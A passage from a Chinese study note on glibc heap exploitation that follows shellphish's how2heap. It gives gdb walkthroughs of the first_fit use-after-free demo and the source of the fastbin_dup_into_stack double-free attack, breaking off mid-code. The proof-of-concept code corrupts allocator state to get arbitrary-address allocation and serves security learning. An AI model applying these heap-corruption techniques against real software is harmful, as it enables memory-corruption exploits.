# How2Heap堆利用学习笔记（一）
|
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
>
> 概述:对Linux下堆利用的学习记录，学习顺序大体是按照shellphish团队的how2heap的流程，尽量每个方面都调试的详尽一些，并结合案例进行分析。
## 环境准备
使用的是Ubuntu16.04，自带的glibc版本如下
    $ file /lib/x86_64-linux-gnu/libc-2.23.so 
    /lib/x86_64-linux-gnu/libc-2.23.so: ELF 64-bit LSB shared object, x86-64, version 1 (GNU/Linux), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b5381a457906d279073822a5ceb24c4bfef94ddb, for GNU/Linux 2.6.32, stripped
官方的github
    $ git clone https://github.com/shellphish/how2heap.git
某些利用技术在2.25以上的gilbc上会失效，只能在glibc_2.25以下实现的技术也已经被分类放在对应文件夹下了，所以ubuntu16.04是一个比较合适的实验环境。
如果系统不符合，也可以自己编译合适版本glibc然后修改系统链接库的环境变量。
    $ ls
    calc_tcache_idx    first_fit    glibc_build.sh      malloc_playground
    calc_tcache_idx.c  first_fit.c  glibc_ChangeLog.md  malloc_playground.c
    fastbin_dup        glibc_2.25   glibc_run.sh        README.md
    fastbin_dup.c      glibc_2.26   Makefile
进入目录进行$make，所有源代码都被编译成功。
查看MakeFile，都是使用本地的glibc进行的编译。
还可以手动添加参数CFLAGS +=
-fsanitize=address用于检测内存错误，个人感觉是类似win下pageheap的机制，用于更准确定位错误内存地址。
**_MakeFile_**
    BASE = fastbin_dup malloc_playground first_fit calc_tcache_idx
    V2.25 = glibc_2.25/fastbin_dup_into_stack glibc_2.25/fastbin_dup_consolidate glibc_2.25/unsafe_unlink glibc_2.25/house_of_spirit glibc_2.25/poison_null_byte glibc_2.25/house_of_lore glibc_2.25/overlapping_chunks glibc_2.25/overlapping_chunks_2 glibc_2.25/house_of_force glibc_2.25/large_bin_attack glibc_2.25/unsorted_bin_attack glibc_2.25/unsorted_bin_into_stack glibc_2.25/house_of_einherjar glibc_2.25/house_of_orange
    V2.26 = glibc_2.26/unsafe_unlink glibc_2.26/house_of_lore glibc_2.26/overlapping_chunks glibc_2.26/large_bin_attack glibc_2.26/unsorted_bin_attack glibc_2.26/unsorted_bin_into_stack glibc_2.26/house_of_einherjar glibc_2.26/tcache_dup glibc_2.26/tcache_poisoning glibc_2.26/tcache_house_of_spirit
    PROGRAMS = $(BASE) $(V2.25) $(V2.26)
    CFLAGS += -std=c99 -g
    # Convenience to auto-call mcheck before the first malloc()
    #CFLAGS += -lmcheck
    all: $(PROGRAMS)
    clean:
    ​    rm -f $(PROGRAMS)
## 1.first_fit
漏洞类型:UAF(但无法利用)
第一题案例我们是无法干预程序行为但，目的是让我们熟悉堆分配机制。
在gdb中使用p main_arena可以看到程序中堆结构的细节。详见glibc源码。
案例源代码://省略了一部分无关输出
    #include 
    #include 
    #include 
    int main()
    {
    ​    fprintf(stderr, "This file doesn't demonstrate an attack, but shows the nature of glibc's allocator.n");
    ​    char* a = malloc(0x512);
    ​    char* b = malloc(0x256);
    ​    char* c;
    ​    fprintf(stderr, "1st malloc(0x512): %pn", a);
    ​    fprintf(stderr, "2nd malloc(0x256): %pn", b);
    ​    fprintf(stderr, "we could continue mallocing here...n");
    ​    fprintf(stderr, "now let's put a string at a that we can read later "this is A!"n");
    ​    strcpy(a, "this is A!");
    ​    fprintf(stderr, "first allocation %p points to %sn", a, a);
    ​    fprintf(stderr, "Freeing the first one...n");
    ​    free(a);
    ​    fprintf(stderr, "So, let's allocate 0x500 bytesn");
    ​    c = malloc(506);
    ​    fprintf(stderr, "3rd malloc(0x500): %pn", c);
    ​    fprintf(stderr, "And put a different string here, "this is C!"n");
    ​    strcpy(c, "this is C!");
    ​    fprintf(stderr, "3rd allocation %p points to %sn", c, c);
    ​    fprintf(stderr, "first allocation %p points to %sn", a, a);
    ​    fprintf(stderr, "If we reuse the first allocation, it now holds the data from the third allocation.n");
    }
###  流程分析
首先通过malloc分配两个内存，返回内存指针地址-0x10是chunk块的真正头部。
这两块内存相邻，header之间的距离正好是0x520字节。
    gdb-peda$ x/5gx 0x603010-0x10
    0x603000:    0x0000000000000000    0x0000000000000521 -->chunkA header
    0x603010:    0x0000000000000000    0x0000000000000000
    0x603020:    0x0000000000000000
    gdb-peda$ x/5gx 0x603530-0x10
    0x603520:    0x0000000000000000    0x0000000000000261 -->chunkB header
    0x603530:    0x0000000000000000    0x0000000000000000
    0x603540:    0x0000000000000000
    执行strcpy向chunkA写入”this is A!”,从内存指针起始地址写入数据。
    gdb-peda$ x/5gx 0x603010-0x10
    0x603000:    0x0000000000000000    0x0000000000000521
    0x603010:    0x2073692073696874    0x0000000000002141
    0x603020:    0x0000000000000000
执行free释放chunkA之后，A内存没有被马上回收，而是链接到了unsorted bin中。
    gdb-peda$ x/5gx 0x603010-0x10
    0x603000:    0x0000000000000000    0x0000000000000521 :    0x0000000000603780     0x0000000000000000
    0x7ffff7dd1b88 :    0x0000000000603000     0x0000000000603000 ->free chunk list
    0x7ffff7dd1b98 :    0x00007ffff7dd1b88
重新malloc一块内存chunk_C,发现分配的内存块正是之前被释放的chunk_A内存。
虽然fd和bk指针依然存在，但是size值已经被改变了。
    gdb-peda$ x/5gx 0x603010-0x10
    0x603000:    0x0000000000000000    0x0000000000000211
    0x603010:    0x00007ffff7dd1fa8    0x00007ffff7dd1fa8
    0x603020:    0x0000000000603000
此时访问unsorted bin,发现此时挂载在unsorted
bin是chunk_A分割出来的一部分，因为申请的C空间小于chunk_A,就从A中分配了一部分给C，剩下的部分继续挂载在bins上。
    gdb-peda$ x/5gx 0x7ffff7dd1b78
    0x7ffff7dd1b78 :    0x0000000000603780     0x0000000000603210
    0x7ffff7dd1b88 :    0x0000000000603210     0x0000000000603210 :    0x00007ffff7dd1b88
    gdb-peda$ x/5gx 0x603210
    0x603210:    0x0000000000000000    0x0000000000000311 
    0x603220:    0x00007ffff7dd1b78    0x00007ffff7dd1b78
执行strcpy向chunk_C写入”this is C!”，内存中也找到了对象的字符串ASCII码。
    gdb-peda$ x/5gx 0x603010-0x10
    0x603000:    0x0000000000000000    0x0000000000000211
    0x603010:    0x2073692073696874    0x00007ffff7002143
    0x603020:    0x0000000000603000
此时的A指针仍然是存在的，所以可能会存在UAF漏洞，这个漏洞之前在分析IE漏洞的时候也分析过，就不再赘述了。
## 2.fastbin_dup_into_stack
漏洞类型fastbin_attack
背景知识:
Fast bins 主要是用于提高小内存的分配效率,使用单链表进行链接，默认情况下，对于 SIZE_SZ 为 4B 的平台， 小于 64B 的 chunk
分配请求，对于 SIZE_SZ 为 8B 的平台，小于 128B 的 chunk 分配请求，首先会查找 fast bins 中是否有所需大小的 chunk
存在(精确匹配)，如果存在，就直接返回。
简介:这个漏洞是我之前与堆溢出相识的第一道题，很不靠谱的以为这是UAF漏洞（当时概念不清）。Fastbin_attack主要是通过修改fd指针，伪造一个fake_chunk，实现对任意地址写。
源代码
    #include 
    #include 
    int main()
    {
    ​    fprintf(stderr, "This file extends on fastbin_dup.c by tricking malloc inton"
    ​           "returning a pointer to a controlled location (in this case, the stack).n");
    ​    unsigned long long stack_var;
    ​    fprintf(stderr, "The address we want malloc() to return is %p.n", 8+(char *)&stack_var);
    ​    fprintf(stderr, "Allocating 3 buffers.n");
    ​    int *a = malloc(8);
    ​    int *b = malloc(8);
    ​    int *c = malloc(8);
    ​    fprintf(stderr, "1st malloc(8): %pn", a);
    ​    fprintf(stderr, "2nd malloc(8): %pn", b);
    ​    fprintf(stderr, "3rd malloc(8): %pn", c);
    ​    fprintf(stderr, "Freeing the first one...n");
    ​    free(a);
    ​    fprintf(stderr, "If we free %p again, things will crash because %p is at the top of the free list.n", a, a);
    ​    // free(a);
    ​    fprintf(stderr, "So, instead, we'll free %p.n", b);
    ​    free(b);
    ​    fprintf(stderr, "Now, we can free %p again, since it's not the head of the free list.n", a);
    ​    free(a);
    ​    fprintf(stderr, "Now the free list has [ %p, %p, %p ]. "
    ​        "We'll now carry out our attack by modifying data at %p.n", a, b, a, a);
    ​    unsigned long long *d = malloc(8);
    ​    fprintf(stderr, "1st malloc(8): %pn", d);
    ​    fprintf(stderr, "2nd malloc(8): %pn", malloc(8));
    ​    fprintf(stderr, "Now the free list has [ %p ].n", a);
    ​    fprintf(stderr, "Now, we have access to %p while it remains at the head of the free list.n"
    ​        "so now we are writing a fake free size (in this case, 0x20) to the stack,n"
    ​        "so that malloc will think there is a free chunk there and agree ton"
    ​        "return a pointer to it.n", a);
    ​    stack_var = 0x20;
    ​    fprintf(stderr, "Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.n", a);
    ​    *d = (unsigned long long) (((char*)&stack_var) - sizeof(d));